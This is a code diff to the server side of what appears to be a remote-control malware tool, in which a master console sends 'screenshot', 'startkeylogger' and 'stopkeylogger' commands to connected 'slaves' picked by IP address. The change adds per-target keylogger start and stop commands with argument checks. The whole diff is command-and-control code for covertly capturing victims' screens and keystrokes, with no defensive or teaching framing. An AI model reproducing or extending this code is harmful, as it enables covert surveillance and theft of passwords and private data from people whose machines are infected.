@@ -46,7 +46,10 @@ def runServer(sharedArray, slaves):
                        + str(data))
                 command = bytearray(sharedArray)
                 decoded = command.decode('utf-8').split(" ")
-                if decoded[0] == "screenshot" and not decoded[1] == addr[0]:
+                if ((decoded[0] == "screenshot" or 
+                    decoded[0] == "startkeylogger" or
+                    decoded[0] == "stopkeylogger") 
+                    and not decoded[1] == addr[0]):
                     command = b" "
                 sres.sendall(command)
                 if(decoded[0] == "screenshot" ):
@@ -108,8 +111,18 @@ if __name__ == "__main__":
                 sharedArray.value = b""
             else:
                 sharedArray[:] = command.encode('utf-8')
-        elif currentSplit[0] == "keylogger":
-            sharedArray[:] = command.encode('utf-8')
+        elif currentSplit[0] == "startkeylogger":
+            if len(currentSplit) < 2 or not slaves.count(currentSplit[1]):
+                print("Invalid argument, should give target ip and target ip should be currently connected")
+                sharedArray.value = b""
+            else:
+                sharedArray[:] = command.encode('utf-8')
+        elif currentSplit[0] == "stopkeylogger":
+            if len(currentSplit) < 2 or not slaves.count(currentSplit[1]):
+                print("Invalid argument, should give target ip and target ip should be currently connected")
+                sharedArray.value = b""
+            else:
+                sharedArray[:] = command.encode('utf-8')
         elif currentSplit[0] == "slaves":
             #Print all active slaves
             message = "\033[4mCURRENT SLAVES:\033[0m"
